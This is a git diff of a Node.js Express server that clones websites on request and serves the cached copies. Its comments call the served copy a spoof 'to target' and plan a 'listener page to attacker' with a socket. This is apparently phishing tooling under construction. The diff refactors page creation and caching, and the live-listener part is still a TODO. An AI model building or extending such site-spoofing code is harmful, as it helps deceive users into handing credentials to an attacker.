@@ -5,7 +5,6 @@ const fsp = require('fs/promises')
 const fs = require('fs')
 const isURL = require('is-url')
 const path = require('path')
-const {v4: uuid, v4} = require('uuid')
 const Cache = require('./models/Cache')
 const Page = require('./models/Page')
 let spoofURL = "https://www.google.com"
@@ -77,6 +76,7 @@ PROGRAM_START()
 
 
 //* SERVER STARTUP
+app.set('view engine', 'ejs')
 app.listen(PORT, (err) => {
     if (err) log(err)
     log(`Server running on port ${PORT}`)
@@ -91,37 +91,28 @@ app.use('/scripts', exp.static('scripts'))
 
 //* ROUTING
 
-//* SERVER SPOOF
+//* SERVE SPOOF TO TARGET
 app.get('/:spoof_url', (req, res)=>{
     // 404 on non existant spoof or invalid url
     if(!isURL(req.params.spoof_url)) return res.sendStatus(404)
     if(!page_cache[req.params.spoof_url]) return res.sendStatus(404)
     res.send(page_cache[req.params.spoof_url].rendered_page)
 })
-
-//* INITITATE SPOOF
+//* INITITATE SPOOF AND SERVE LISTENER PAGE TO ATTACKER
 app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
     let url_2_spoof = decodeURI(req.body.url)
     log(`Spoof request for __ ${url_2_spoof} __`)
     let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
     return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
+    // TODO Replace redirect with ejs render function containing listener socket
 })
+
 
 //! Handle creation of new pages for caching
 async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
-    let new_page = new Page()
-
-    // TODO This must be handled by each Page object internally from now on
-    new_page.download_page = await download_page(url)
-    new_page.rendered_page = await render_page(url)
-    new_page.url = url
-
-    // TODO Access internal Page methods here 
-
-
+    let new_page = new Page(url)
     // set into global pages object
-    page_cache[url] = new_page 
-    // page_cache.addPage()
+    page_cache.addPage(new_page)
 
     //TODO Create new WS session
 
